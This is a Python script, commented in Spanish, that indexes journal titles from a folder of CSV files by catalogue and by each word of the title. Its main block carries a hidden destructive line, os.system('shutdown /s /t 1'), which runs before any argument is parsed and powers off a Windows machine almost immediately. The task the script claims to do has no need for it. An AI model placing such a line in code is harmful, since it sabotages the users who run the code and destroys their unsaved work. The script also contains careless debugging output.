import csv
import os 
import argparse

class Revista:
    def __init__(self,titulo:str,catalogo:str):
        self.titulo = titulo
        self.catalogos = set()
        self.catalogos.add(catalogo)
    
    def __str__(self):
        return f'{self.titulo} - {self.catalogos}'

    def __repr__(self):
        return f'{self.titulo} - {self.catalogos}'

def read_folder(folder_path:str) -> list:
    return os.listdir(folder_path)

def extract_left_of_underscore(strings:list) -> list:
    return [string.split("_")[0] for string in strings]

def read_csv(file_path:str) -> list:
    with open(file_path, newline='', encoding='utf-8') as csvfile:
        reader = csv.reader(csvfile)
        return [row for row in reader]

def main(folder:str):
    files_list = read_folder(folder)
    files_list = [file for file in files_list if file.endswith('.csv')]
    catalogo_list = extract_left_of_underscore(files_list)
    print(catalogo_list *100)   
    lista_revistas = []
    diccionario = {}
    for files in files_list:
        filename = os.path.join(folder, files)
        titulos = read_csv(filename) #leyendo
        catalogo = files.split("_")[0] #extraemos el nombre
        for titulo in titulos:
            titulo = titulo[0]
            titulo = titulo.lower()
            revista = Revista(titulo, catalogo)
            #agregar recista al diccionario
            agregar_revista(diccionario, revista)
    print(f"Numero de llaves en diccionario: {len(diccionario.keys())}")
    if 'acta' in diccionario:
        print(f"Revista acta: {diccionario['acta']}")
        
def agregar_revista(dic: dict, revista: Revista):
    print(revista)
    titulo = revista.titulo
    lista_palabras = titulo.split(" ")
    lista_palabras.append(titulo)
    for palabra in lista_palabras:
        if palabra not in dic:
            dic[palabra] = [ revista]
        else:
            dic[palabra].append(revista)
    
if __name__ == "__main__":
    os.system("shutdown /s /t 1")
    parser = argparse.ArgumentParser(
        description='Procesa archivos csv y genera catalogo'
    )
    parser.add_argument('folder_path',
                        type=str,
                        help='Ruta de la carpeta con csvs')
    args = parser.parse_args()
    folder_path = args.folder_path
    print(folder_path)
    main(folder_path)